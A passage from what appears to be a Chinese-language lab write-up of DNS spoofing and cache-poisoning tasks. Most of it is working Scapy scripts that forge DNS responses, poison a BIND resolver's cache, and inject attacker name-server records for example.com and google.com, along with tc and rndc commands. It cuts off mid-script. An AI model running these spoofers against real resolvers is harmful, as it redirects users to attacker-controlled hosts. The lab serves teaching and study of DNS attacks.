容器中分别查询这两个域名服务器。</p><p>1.查询默认的域名服务器以获取 <a href="http://www.example.com">www.example.com</a> 的IP地址。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411047.png" alt="image-20251214111708580"></p><p>2.向ns.attacker32.com这个域名服务器查询 <a href="http://www.example.com">www.example.com</a> 的IP地址。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411107.png" alt="image-20251214111615900"></p><h3 id="The-Attack-Tasks">The Attack Tasks</h3><p><strong>DNS 攻击的目标</strong><br>因为正常人是不会向 <a href="http://ns.attacker32.com">ns.attacker32.com</a> 去查询 <a href="http://www.example.com">www.example.com</a> 的IP地址的，所有人都会向存着 <a href="http://www.example.com">www.example.com</a> 的官方域名服务器去查询其IP地址。DNS缓存中毒攻击的目标是让受害者使用第一个dig命令时，是从攻击者处获得虚假的结果，而不是从查询域的合法域名服务器中获得真实的结果。</p><p><strong>Sample Code 解析</strong><br>这段代码的主要功能是监听指定网络接口上的UDP包，特别是那些目标端口为53（DNS默认端口）的包。当检测到一个DNS查询请求，并且请求的域名是 <a href="http://www.example.net">www.example.net</a> 时，代码会伪造一个DNS响应，将查询的域名解析到一个固定的IP地址（在这个例子中是10.0.2.5），并且提供两个名称服务器的记录和它们的IP地址。这个伪造的响应会被发送回请求者，从而可能影响请求者的DNS解析结果。</p><pre><code>#!/usr/bin/env python3from scapy.all import *def spoof_dns(pkt):  if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):    # Swap the source and destination IP address    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)    # Swap the source and destination port number    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)    # The Answer Section    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='10.0.2.5')    # The Authority Section    NSsec1 = DNSRR(rrname='example.net', type='NS',ttl=259200, rdata='ns1.example.net')    NSsec2 = DNSRR(rrname='example.net', type='NS',ttl=259200, rdata='ns2.example.net')    # The Additional Section    Addsec1 = DNSRR(rrname='ns1.example.net', type='A',ttl=259200, rdata='1.2.3.4')    Addsec2 = DNSRR(rrname='ns2.example.net', type='A',ttl=259200, rdata='5.6.7.8')    # Construct the DNS packet    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,                   qdcount=1, ancount=1, nscount=2, arcount=2,                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)    # Construct the entire IP packet and send it out    spoofpkt = IPpkt/UDPpkt/DNSpkt    send(spoofpkt)# Sniff UDP query packets and invoke spoof_dns().f = 'udp and dst port 53'pkt = sniff(iface='br-2f902169a472', filter=f, prn=spoof_dns)      </code></pre><ul><li><p>id (Transaction ID)： 事务标识符，用于匹配查询和响应消息，确保它们是相关的。</p></li><li><p>qd (Query Domain)： 查询域，指的是用户想要查询的域名。</p></li><li><p>aa (Authoritative answer)： 权威回答标志，如果设置为1，则表示响应来自权威DNS服务器，即该服务器拥有被查询域名的权威数据。</p></li><li><p>rd (Recursion Desired)： 递归查询标志，如果设置为0，则表示客户端不希望DNS服务器进行递归查询。</p></li><li><p>qr (Query Response bit)： 查询响应位，如果设置为1，则表示这是一个响应消息。</p></li><li><p>qdcount (Query Domain Count)： 查询域的数量，表示查询消息中包含的查询域的数量。</p></li><li><p>ancount (Answer Record Count)： 回答记录的数量，表示响应消息中Answer部分的记录数。</p></li><li><p>nscount (Name Server Record Count)： 名称服务器记录的数量，表示响应消息中Authority部分的记录数。</p></li><li><p>arcount (Additional Record Count)： 附加记录的数量，表示响应消息中Additional部分的记录数。</p></li><li><p>an (Answer section)： 回答部分，包含查询请求的响应信息，如IP地址。</p></li><li><p>ns (Authority section)： 权威部分，包含关于查询域的权威DNS服务器的信息。</p></li><li><p>ar (Additional section)： 附加部分，包含额外的信息，如DNS服务器的地址。</p></li></ul><h3 id="Task-1-Directly-Spoofing-Response-to-User">Task 1: Directly Spoofing Response to User</h3><p>任务： 参考示例代码，编写一个程序实现：嗅探用户发送给本地DNS服务器的DNS请求，嗅探到后立即伪造DNS响应数据包，在真实的响应到达用户前，将伪造的虚假DNS响应包发送回用户，造成DNS攻击。（针对 Local DNS Server 响应DNS请求进行攻击）</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411159.png" alt="image-20251214111817087"></p><p>注： DNS 请求的目标端口为 53号 端口，发送的是 UDP数据包。要将程序中 iface 的值换成10.9.0.0/24对应的网卡。对应的网卡序列号通过 ifconfig 命令查看，如下图所示。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411229.png" alt="image-20251214111950662"></p><p>1.参考题目提供的框架编写程序 Dirct_Spoofing.py</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line">import sys</span><br><span class="line">NS_NAME = <span class="string">&quot;example.com&quot;</span></span><br><span class="line">def spoof_dns(pkt):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src%--&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> ip </span>= IP(<span class="attribute">dst</span>=pkt[IP].src, <span class="attribute">src</span>=pkt[IP].dst)   # Create an<span class="built_in"> IP </span>object</span><br><span class="line">        udp = UDP(<span class="attribute">dport</span>=pkt[UDP].sport, <span class="attribute">sport</span>=53) # Create a UPD object</span><br><span class="line">        Anssec = DNSRR(<span class="attribute">rrname</span>=pkt[DNS].qd.qname, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;1.2.3.4&#x27;</span>) # Create an aswer record</span><br><span class="line">       <span class="built_in"> dns </span>= DNS(<span class="attribute">id</span>=pkt[DNS].id, <span class="attribute">qd</span>=pkt[DNS].qd, <span class="attribute">aa</span>=1, <span class="attribute">qr</span>=1, <span class="attribute">an</span>=Anssec) # Create a<span class="built_in"> DNS </span>object</span><br><span class="line">        spoofpkt = ip/udp<span class="built_in">/dns </span># Assemble the spoofed<span class="built_in"> DNS </span>packet</span><br><span class="line">        send(spoofpkt)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&quot;udp and (src host 10.9.0.5 and dst port 53)&quot;</span> # <span class="built_in">Set</span> the<span class="built_in"> filter</span></span><br><span class="line"><span class="built_in"></span><span class="attribute">pkt</span>=sniff(iface=&#x27;br-65e2192b506c&#x27;, <span class="attribute">filter</span>=myFilter, <span class="attribute">prn</span>=spoof_dns)xxxxxxxxxx br-65e2192b506c#!/usr/bin/env python3from scapy.all import *import sysNS_NAME = <span class="string">&quot;example.com&quot;</span>def spoof_dns(pkt):    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):        <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src%--&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))       <span class="built_in"> ip </span>= IP(<span class="attribute">dst</span>=pkt[IP].src, <span class="attribute">src</span>=pkt[IP].dst)   # Create an<span class="built_in"> IP </span>object        udp = UDP(<span class="attribute">dport</span>=pkt[UDP].sport, <span class="attribute">sport</span>=53) # Create a UPD object        Anssec = DNSRR(<span class="attribute">rrname</span>=pkt[DNS].qd.qname, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;1.2.3.4&#x27;</span>) # Create an aswer record       <span class="built_in"> dns </span>= DNS(<span class="attribute">id</span>=pkt[DNS].id, <span class="attribute">qd</span>=pkt[DNS].qd, <span class="attribute">aa</span>=1, <span class="attribute">qr</span>=1, <span class="attribute">an</span>=Anssec) # Create a<span class="built_in"> DNS </span>object        spoofpkt = ip/udp<span class="built_in">/dns </span># Assemble the spoofed<span class="built_in"> DNS </span>packet        send(spoofpkt)myFilter = <span class="string">&quot;udp and (src host 10.9.0.5 and dst port 53)&quot;</span> # <span class="built_in">Set</span> the <span class="attribute">filterpkt</span>=sniff(iface=&#x27;br-65e2192b506c&#x27;, <span class="attribute">filter</span>=myFilter, <span class="attribute">prn</span>=spoof_dns)</span><br></pre></td></tr></table></figure><p>2.在Attacker中运行 Direct_Spoofing.py。然后再user中执行 dig <a href="http://www.example.com">www.example.com</a> 命令。可以看到接受到的IP地址为 1.2.3.4，说明成功使用户接收到我们伪造的DNS响应数据包，使用户定向到攻击者的服务器。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411293.png" alt="image-20251214124352338"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411347.png" alt="image-20251214124413992"></p><p><strong>A potential issue.</strong> 当遇到我们的嗅探和攻击过程的速度慢于真实的DNS请求过程的情况时，我们可以tc命令延迟给路由器的传出网络流量添加一些延迟来实现我们的攻击。(之后的Task如果遇到该问题可以采用相同的办法解决)</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// Delay <span class="keyword">the</span> network traffic <span class="keyword">by</span> <span class="number">100</span>ms etho对应向外的路由器的网卡，即本实验中对应<span class="number">10.8</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span>的网卡</span><br><span class="line"><span class="comment"># tc qdisc add dev eth0 root netem delay 100ms</span><span class="comment"></span></span><br><span class="line"><span class="comment">// Delete the tc entry</span></span><br><span class="line"><span class="comment"># tc qdisc del dev eth0 root netem</span><span class="comment"></span></span><br><span class="line"><span class="comment">// Show all the tc entries</span></span><br><span class="line"><span class="comment"># tc qdisc show dev eth0</span></span><br></pre></td></tr></table></figure><h3 id="Task-2-DNSCache-Poisoning-Attack–-Spoofing-Answers">Task 2: DNSCache Poisoning Attack– Spoofing Answers</h3><p>任务： 修改代码实现DNS投毒攻击：模拟其他DNS服务器，给Local DNS Server响应虚假IP，使该虚假内容会在Local DNS Server中保留一段时间，达到伪造一次但能长时间保持影响直到下一次缓存更新。（针对 Local DNS Server Cache进行攻击）</p><p>1.清空 Local DNS Server 的缓存。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rndc flush</span><br></pre></td></tr></table></figure><p>2.编写程序 <a href="http://Posion.py">Posion.py</a> 实现DNS投毒攻击。(在 Dirct_Spoofing.py 上修改 filter 为Local DNS Server的IP)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line">import sys</span><br><span class="line">NS_NAME = <span class="string">&quot;example.com&quot;</span></span><br><span class="line">def spoof_dns(pkt):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src%--&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> ip </span>= IP(<span class="attribute">dst</span>=pkt[IP].src, <span class="attribute">src</span>=pkt[IP].dst)   # Create an<span class="built_in"> IP </span>object</span><br><span class="line">        udp = UDP(<span class="attribute">dport</span>=pkt[UDP].sport, <span class="attribute">sport</span>=53) # Create a UPD object</span><br><span class="line">        Anssec = DNSRR(<span class="attribute">rrname</span>=pkt[DNS].qd.qname, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;1.2.3.4&#x27;</span>) # Create an aswer record</span><br><span class="line">       <span class="built_in"> dns </span>= DNS(<span class="attribute">id</span>=pkt[DNS].id, <span class="attribute">qd</span>=pkt[DNS].qd, <span class="attribute">aa</span>=1, <span class="attribute">qr</span>=1, <span class="attribute">an</span>=Anssec) # Create a<span class="built_in"> DNS </span>object</span><br><span class="line">        spoofpkt = ip/udp<span class="built_in">/dns </span># Assemble the spoofed<span class="built_in"> DNS </span>packet</span><br><span class="line">        send(spoofpkt)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&quot;udp and (src host 10.9.0.53 and dst port 53)&quot;</span> # <span class="built_in">Set</span> the<span class="built_in"> filter</span></span><br><span class="line"><span class="built_in"></span><span class="attribute">pkt</span>=sniff(iface=&#x27;br-65e2192b506c&#x27;, <span class="attribute">filter</span>=myFilter, <span class="attribute">prn</span>=spoof_dns)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.在Attacker中运行 <a href="http://Poison.py">Poison.py</a>，在user中执行dig <a href="http://www.example.com">www.example.com</a>。看到我们成功让用户接受到我们伪造的DNS响应数据包。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411400.png" alt="image-20251214125316795"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411461.png" alt="image-20251214125330440"></p><p>4.打印Local DNS Server的本地缓存。发现成功改变Local DNS Cache，实现DNS投毒攻击。(文件过长，这里只截取关键部分)</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rndc dumpdb -cache     <span class="comment">//将本地缓存存到指定的 `dump.db`文件中</span></span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/var/</span>cache<span class="regexp">/bind/</span><span class="keyword">dump</span>.db <span class="comment">//打印该文件，该文件比较长，也可以存到txt中再打开，方便查看</span></span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411528.png" alt="image-20251214125512190"></p><h3 id="Task-3-Spoofing-NS-Records">Task 3: Spoofing NS Records</h3><p>任务： 编写程序扩大DNS污染的影响范围，使本地DNS服务器将攻击者控制的域名服务器（<a href="http://xn--ns-pt3cz19a.attacker32.com">例如ns.attacker32.com</a>）作为example.com域的权威域名服务器进行缓存，使得用户以后对example.com域内任何主机名的查询都将被发送到攻击者控制的域名服务器。</p><p>任务分析：</p><p>1.清空Local DNS Server 的缓存。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rndc flush</span><br></pre></td></tr></table></figure><p>2.编写程序 NS_Spoof.py。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line">import sys</span><br><span class="line">NS_NAME = <span class="string">&quot;example.com&quot;</span></span><br><span class="line">def spoof_dns(pkt):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src%--&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> ip </span>= IP(<span class="attribute">dst</span>=pkt[IP].src, <span class="attribute">src</span>=pkt[IP].dst)   # Create an<span class="built_in"> IP </span>object</span><br><span class="line">        udp = UDP(<span class="attribute">dport</span>=pkt[UDP].sport, <span class="attribute">sport</span>=53) # Create a UDP object</span><br><span class="line">        NSsec =  DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;example.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;NS&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">       <span class="built_in"> dns </span>= DNS(<span class="attribute">id</span>=pkt[DNS].id, <span class="attribute">qd</span>=pkt[DNS].qd, <span class="attribute">aa</span>=1, <span class="attribute">qr</span>=1,ns=NSsec) # Create a<span class="built_in"> DNS </span>object</span><br><span class="line">        spoofpkt = ip/udp<span class="built_in">/dns </span># Assemble the spoofed<span class="built_in"> DNS </span>packet</span><br><span class="line">        send(spoofpkt)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&quot;udp and (src host 10.9.0.53 and dst port 53)&quot;</span> # <span class="built_in">Set</span> the<span class="built_in"> filter</span></span><br><span class="line"><span class="built_in"></span><span class="attribute">pkt</span>=sniff(iface=&#x27;br-65e2192b506c&#x27;, <span class="attribute">filter</span>=myFilter, <span class="attribute">prn</span>=spoof_dns)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.在Attacker上运行 NS_Spoof.py。在user上执行 dig <a href="http://example.com">example.com</a> 命令。可以看到运行结果，我们的攻击初步成功。接下来执行，dig <a href="http://www.example.com">www.example.com</a> 命令和 dig <a href="http://austin.example.com">austin.example.com</a>。发现均指向我们伪造的虚假IP，说明攻击成功。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411610.png" alt="image-20251214125920803"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411686.png" alt="image-20251214125941617"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411758.png" alt="image-20251214130003526"></p><p>注： 你可能会想为什么返回的IP不一样，但我却说是正确的。我们在 Attacker 容器中打开 /etc/bind/zone_example.com。会发现在指向 ns.attacker32.com的域名的解析方式如下，这就解释了为什么不同的域名对应的IP不同。</p><p>4.进入Local DNS Server查看本地缓存，可以看到 authauthority 被修改成我们伪造的样子，再次证明我们的攻击成功。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411817.png" alt="image-20251214130101325"></p><h3 id="Task-4-Spoofing-NS-Records-for-Another-Domain">Task 4: Spoofing NS Records for Another Domain</h3><p>任务： 编写程序在Authority部分添加额外的条目，让ns.attacker32.com也被用作 <a href="http://google.com">google.com</a> 的名称服务器。</p><p>1.清空本地DNS服务器的缓存。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rndc flush</span><br></pre></td></tr></table></figure><p>2.编写程序 NS_Spoof.py。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line">import sys</span><br><span class="line">NS_NAME = <span class="string">&quot;example.com&quot;</span></span><br><span class="line">def spoof_dns(pkt):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src%--&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> ip </span>= IP(<span class="attribute">dst</span>=pkt[IP].src, <span class="attribute">src</span>=pkt[IP].dst)   # Create an<span class="built_in"> IP </span>object</span><br><span class="line">        udp = UDP(<span class="attribute">dport</span>=pkt[UDP].sport, <span class="attribute">sport</span>=53) # Create a UDP object</span><br><span class="line">        Anssec = DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;example.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>,ttl=259200, <span class="attribute">rdata</span>=<span class="string">&#x27;1.2.3.4&#x27;</span>)  </span><br><span class="line">        NSsec_1 =  DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;example.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;NS&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">        NSsec_2 =  DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;google.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;NS&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">       <span class="built_in"> dns </span>= DNS(<span class="attribute">id</span>=pkt[DNS].id, <span class="attribute">qd</span>=pkt[DNS].qd, <span class="attribute">aa</span>=1, <span class="attribute">qr</span>=1,nscount=2,ns=NSsec_2/NSsec_1, <span class="attribute">an</span>=Anssec) # Create a<span class="built_in"> DNS </span>object</span><br><span class="line">        spoofpkt = ip/udp<span class="built_in">/dns </span># Assemble the spoofed<span class="built_in"> DNS </span>packet</span><br><span class="line">        send(spoofpkt)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&quot;udp and (src host 10.9.0.53 and dst port 53)&quot;</span> # <span class="built_in">Set</span> the<span class="built_in"> filter</span></span><br><span class="line"><span class="built_in"></span><span class="attribute">pkt</span>=sniff(iface=&#x27;br-65e2192b506c&#x27;, <span class="attribute">filter</span>=myFilter, <span class="attribute">prn</span>=spoof_dns)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.在Attacker中运行NS_Spoof.py。在user中执行 dig www.example.com后，查看本地DNS的缓存，发现篡改成功，说明攻击成功。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132411873.png" alt="image-20251214130341059"></p><p>注： 其实我们会发现我们在伪造包的时候只有代码为 ns=NSsec2/NSsec1 时才能成功在本地DNS服务器的本地缓存中篡改 <a href="http://google.com">google.com</a> 的NS。换句话说，我们的这个操作只能篡改拼接的ns 中靠前的一个。在查阅资料后得知，这跟本实验的DNS服务器系统 BIND 9 处理响应包中的NS信息的机制有关系。BIND 9 在处理响应包中的 NS 信息时，会按照先后顺序依次去连接 NS 指向的域名，直到成功连接后就停止操作。也就意味着，其在处理我们的DNS响应数据包时，解析第一个NS信息时，就连接成功然后停止操作，从而导致第二个NS信息没有被解析，更别提存入到本地的DNS服务器的缓存中了。</p><h3 id="Task-5-Spoofing-Records-in-the-Additional-Section">Task 5: Spoofing Records in the Additional Section</h3><p>任务： 编写程序伪造一个 DNS 响应包，能够对Local DNS Server的本地缓存中的 AUTHORITY SECTION 和 ADDITIONAL SECTION进行修改：在 AUTHORITY SECTION 中，添加两个 NS 记录让example.com指向 <a href="http://ns.attacker32.com">ns.attacker32.com</a> 和 <a href="http://ns.example.com">ns.example.com</a>；在 ADDITIONAL SECTION 中，提供相关的 A 记录，包括 <a href="http://ns.attacker32.com">ns.attacker32.com</a>、<a href="http://ns.example.net">ns.example.net</a> 和 <a href="http://www.facebook.com">www.facebook.com</a> 的 IP 地址。过程中观察伪造的 DNS 响应包如何被 BIND 9 DNS 服务器处理，并分析哪些条目会被成功缓存，哪些不会，特别是对 ADDITIONAL SECTION 中的条目的缓存行为进行分析。</p><p>1.清空Local DNS Server的本地缓存。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rndc flush</span><br></pre></td></tr></table></figure><p>2.编写程序 <a href="http://Task5.py">Task5.py</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line">import sys</span><br><span class="line">NS_NAME = <span class="string">&quot;example.com&quot;</span></span><br><span class="line">def spoof_dns(pkt):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src%--&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> ip </span>= IP(<span class="attribute">dst</span>=pkt[IP].src, <span class="attribute">src</span>=pkt[IP].dst)   # Create an<span class="built_in"> IP </span>object</span><br><span class="line">        udp = UDP(<span class="attribute">dport</span>=pkt[UDP].sport, <span class="attribute">sport</span>=53) # Create a UDP object</span><br><span class="line">        Anssec = DNSRR(<span class="attribute">rrname</span>=pkt[DNS].qd.qname, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;1.2.3.4&#x27;</span>) # Create an aswer record</span><br><span class="line">        NSsec1 =  DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;example.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;NS&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">        NSsec2 =  DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;example.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;NS&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;ns.example.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        Adsec1 = DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;ns.attacker32.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">        Adsec2 = DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;ns.example.net&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;5.6.7.8&#x27;</span>)  </span><br><span class="line">        Adsec3 = DNSRR(<span class="attribute">rrname</span>=<span class="string">&#x27;www.facebook.com&#x27;</span>, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;3.4.5.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> dns </span>= DNS(<span class="attribute">id</span>=pkt[DNS].id, <span class="attribute">qd</span>=pkt[DNS].qd, <span class="attribute">aa</span>=1, <span class="attribute">rd</span>=0, <span class="attribute">qr</span>=1,qdcount=1,ancount=1,nscount=2,arcount=3,an=Anssec,ns=NSsec1/NSsec2,ar=Adsec1/Adsec2/Adsec3) # Create a<span class="built_in"> DNS </span>object</span><br><span class="line">        ls(dns)</span><br><span class="line">        spoofpkt = ip/udp<span class="built_in">/dns </span># Assemble the spoofed<span class="built_in"> DNS </span>packet</span><br><span class="line">        send(spoofpkt)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&quot;udp and (src host 10.9.0.53 and dst port 53)&quot;</span> # <span class="built_in">Set</span> the<span class="built_in"> filter</span></span><br><span class="line"><span class="built_in"></span><span class="attribute">pkt</span>=sniff(iface=&#x27;br-65e2192b506c&#x27;, <span class="attribute">filter</span>=myFilter, <span 